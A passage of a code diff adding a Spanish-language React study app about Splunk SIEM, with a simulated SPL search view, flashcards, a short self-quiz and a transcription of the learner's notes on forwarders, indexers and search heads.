+                            className="bg-slate-900 px-2.5 py-1.5 rounded border border-slate-800"
+                          >
+                            <span className="text-slate-400 font-mono">{k}: </span>
+                            <span className="text-amber-300 font-mono font-medium">{v}</span>
+                          </div>
+                        ))}
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Step 3: Search Head & SPL */}
+                  <div className="bg-slate-950 border border-sky-500/30 rounded-xl p-5 space-y-4">
+                    <div className="flex flex-wrap items-center justify-between gap-2">
+                      <span className="text-xs font-mono font-semibold text-sky-400">
+                        3. SEARCH HEAD • Search and Report App (SPL)
+                      </span>
+                      <div className="flex gap-2">
+                        {currentSim.splQueries.map((q, idx) => (
+                          <button
+                            key={idx}
+                            onClick={() => setSimQueryIdx(idx)}
+                            className={`text-xs px-3 py-1 rounded-lg border transition ${
+                              simQueryIdx === idx
+                                ? 'bg-sky-500 text-slate-950 font-semibold border-sky-400'
+                                : 'bg-slate-900 text-slate-300 border-slate-800 hover:border-slate-700'
+                            }`}
+                          >
+                            {q.chartType === 'bar' ? '📊 Create Dashboard' : '📋 Create Table'}
+                          </button>
+                        ))}
+                      </div>
+                    </div>
+
+                    {/* SPL Search Bar */}
+                    <div className="bg-slate-900 border border-slate-700 rounded-xl p-3 flex items-center gap-3">
+                      <span className="text-emerald-400 font-mono font-bold text-sm">SPL&gt;</span>
+                      <code className="text-xs sm:text-sm text-sky-300 font-mono flex-1 overflow-x-auto">
+                        {currentQuery.cmd}
+                      </code>
+                    </div>
+                    <p className="text-xs text-slate-400">{currentQuery.desc}</p>
+
+                    {/* Output Visualization */}
+                    {currentQuery.chartType === 'bar' ? (
+                      <div className="space-y-3 pt-2">
+                        {currentQuery.results.map((r, i) => (
+                          <div key={i} className="space-y-1">
+                            <div className="flex justify-between text-xs">
+                              <span className="font-mono text-slate-200">{r.label}</span>
+                              <span className="font-mono text-slate-400">
+                                {r.value} eventos ({r.pct}%)
+                              </span>
+                            </div>
+                            <div className="w-full h-3 bg-slate-900 rounded-full overflow-hidden border border-slate-800">
+                              <div
+                                className={`h-full ${r.color} rounded-full transition-all duration-500`}
+                                style={{ width: `${r.pct}%` }}
+                              />
+                            </div>
+                          </div>
+                        ))}
+                      </div>
+                    ) : (
+                      <div className="overflow-x-auto pt-2">
+                        <table className="w-full text-left border-collapse text-xs font-mono">
+                          <thead>
+                            <tr className="border-b border-slate-800 text-sky-400 bg-slate-900/80">
+                              {currentQuery.headers.map((h, i) => (
+                                <th key={i} className="py-2 px-3">
+                                  {h}
+                                </th>
+                              ))}
+                            </tr>
+                          </thead>
+                          <tbody className="divide-y divide-slate-800/60">
+                            {currentQuery.rows.map((row, rIdx) => (
+                              <tr key={rIdx} className="hover:bg-slate-900/40">
+                                {row.map((cell, cIdx) => (
+                                  <td key={cIdx} className="py-2 px-3 text-slate-300">
+                                    {cell}
+                                  </td>
+                                ))}
+                              </tr>
+                            ))}
+                          </tbody>
+                        </table>
+                      </div>
+                    )}
+                  </div>
+                </div>
+              </div>
+            )}
+
+            {/* TAB 3: FLASHCARDS */}
+            {activeTab === 'cards' && (
+              <div className="space-y-4">
+                <div>
+                  <h2 className="text-lg font-bold text-white">
+                    Flashcards de Repaso Activo
+                  </h2>
+                  <p className="text-xs text-slate-400">
+                    Haz clic en cualquier tarjeta para girar y comprobar la respuesta exacta basada en tus apuntes.
+                  </p>
+                </div>
+
+                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  {FLASHCARDS.map((card, idx) => {
+                    const isFlipped = !!flippedCards[idx];
+                    return (
+                      <button
+                        key={idx}
+                        onClick={() => toggleCard(idx)}
+                        className={`text-left p-5 rounded-2xl border transition min-h-[190px] flex flex-col justify-between ${
+                          isFlipped
+                            ? 'bg-emerald-950/30 border-emerald-500/60'
+                            : 'bg-slate-900 border-slate-800 hover:border-slate-700'
+                        }`}
+                      >
+                        <div className="flex items-center justify-between text-xs font-mono">
+                          <span className={isFlipped ? 'text-emerald-400' : 'text-slate-400'}>
+                            {isFlipped ? 'RESPUESTA' : `TARJETA #${idx + 1}`}
+                          </span>
+                          <span className="text-slate-500">Clic para girar ↻</span>
+                        </div>
+
+                        <div className="my-3">
+                          {isFlipped ? (
+                            <p className="text-xs sm:text-sm text-emerald-100 whitespace-pre-line leading-relaxed font-medium">
+                              {card.a}
+                            </p>
+                          ) : (
+                            <p className="text-sm font-bold text-white leading-snug">
+                              {card.q}
+                            </p>
+                          )}
+                        </div>
+
+                        <div className="text-[11px] text-slate-500">
+                          Apuntes Splunk SIEM
+                        </div>
+                      </button>
+                    );
+                  })}
+                </div>
+              </div>
+            )}
+
+            {/* TAB 4: QUIZ */}
+            {activeTab === 'quiz' && (
+              <div className="space-y-6">
+                <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 flex items-center justify-between">
+                  <div>
+                    <h2 className="text-lg font-bold text-white">
+                      Autoevaluación de tus Apuntes
+                    </h2>
+                    <p className="text-xs text-slate-400">
+                      Responde las 5 preguntas clave sobre la hoja de tu cuaderno.
+                    </p>
+                  </div>
+                  <div className="text-right">
+                    <div className="text-xs text-slate-400">Puntuación</div>
+                    <div className="text-2xl font-bold text-emerald-400">
+                      {score} / {QUIZ_QUESTIONS.length}
+                    </div>
+                  </div>
+                </div>
+
+                <div className="space-y-4">
+                  {QUIZ_QUESTIONS.map((q, qIdx) => {
+                    const userAns = quizAnswers[qIdx];
+                    const answered = userAns !== undefined;
+                    return (
+                      <div
+                        key={qIdx}
+                        className="bg-slate-900 border border-slate-800 rounded-2xl p-5 space-y-3"
+                      >
+                        <h3 className="text-sm font-bold text-white">
+                          {qIdx + 1}. {q.question}
+                        </h3>
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                          {q.options.map((opt, optIdx) => {
+                            let btnStyle = 'bg-slate-950 border-slate-800 text-slate-300 hover:border-slate-700';
+                            if (answered) {
+                              if (optIdx === q.correct) {
+                                btnStyle = 'bg-emerald-950/60 border-emerald-500 text-emerald-200 font-semibold';
+                              } else if (optIdx === userAns) {
+                                btnStyle = 'bg-rose-950/60 border-rose-500 text-rose-200';
+                              }
+                            }
+                            return (
+                              <button
+                                key={optIdx}
+                                onClick={() => handleQuizSelect(qIdx, optIdx)}
+                                className={`text-left text-xs p-3 rounded-xl border transition ${btnStyle}`}
+                              >
+                                {opt}
+                              </button>
+                            );
+                          })}
+                        </div>
+                        {answered && (
+                          <div className="text-xs bg-slate-950 border border-slate-800 p-3 rounded-xl text-slate-300">
+                            {q.explanation}
+                          </div>
+                        )}
+                      </div>
+                    );
+                  })}
+                </div>
+              </div>
+            )}
+          </main>
+
+          {/* Modal con transcripción exacta del cuaderno */}
+          {showNotebookModal && (
+            <div className="fixed inset-0 bg-black/75 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+              <div className="bg-slate-900 border border-slate-700 rounded-2xl max-w-2xl w-full p-6 space-y-4 max-h-[85vh] overflow-y-auto">
+                <div className="flex items-center justify-between border-b border-slate-800 pb-3">
+                  <h3 className="font-bold text-white text-lg">
+                    📓 Transcripción Exacta de tu Hoja de Apuntes
+                  </h3>
+                  <button
+                    onClick={() => setShowNotebookModal(false)}
+                    className="text-slate-400 hover:text-white text-sm px-2 py-1 rounded bg-slate-800"
+                  >
+                    Cerrar ✕
+                  </button>
+                </div>
+
+                <div className="space-y-3 text-xs font-mono text-slate-300">
+                  <div className="p-3 bg-slate-950 rounded-xl border border-slate-800">
+                    <div className="text-emerald-400 font-bold mb-1">ENCABEZADO Y FLUJO SUPERIOR:</div>
+                    <p>• Título: Splunk SIEM</p>
+                    <p>• Flujo: Network ➔ Logs ➔ Splunk</p>
+                    <p>• Pilares: Monitoring | Visibility | Observability</p>
+                  </div>
+
+                  <div className="p-3 bg-slate-950 rounded-xl border border-slate-800">
+                    <div className="text-emerald-400 font-bold mb-1">COLUMNA 1: FORWARDER</div>
+                    <p>• Agent installed</p>
+                    <p>• Sending data to Splunk instance</p>
+                    <p>• Web Server (web traffic)</p>
+                    <p>• Windows Sysmon data (Windows Event, PowerShell)</p>
+                    <p>• Linux (Host-centric logs)</p>
+                    <p>• Database (DB requests, responses, errors)</p>
+                  </div>
+
+                  <div className="p-3 bg-slate-950 rounded-xl border border-slate-800">
+                    <div className="text-amber-400 font-bold mb-1">COLUMNA 2: INDEXER (Main Role)</div>
+                    <p>• Parses</p>
+                    <p>• Normalizes</p>
+                    <p>• Categorizes</p>
+                    <p>• Store</p>
+                  </div>
+
+                  <div className="p-3 bg-slate-950 rounded-xl border border-slate-800">
+                    <div className="text-sky-400 font-bold mb-1">COLUMNA 3: SEARCH HEAD</div>
+                    <p>• Search and Report App</p>
+                    <p>• SPL (Search Processing Language)</p>
+                    <p>• Create Dashboard (Gráficos de líneas, circular/pie y barras)</p>
+                    <p>• Tables</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
+        </div>
+      );
+    }
+
+    const root = ReactDOM.createRoot(document.getElementById('root'));
+    root.render(<App />);
+  </script>
+</body>
+</html>
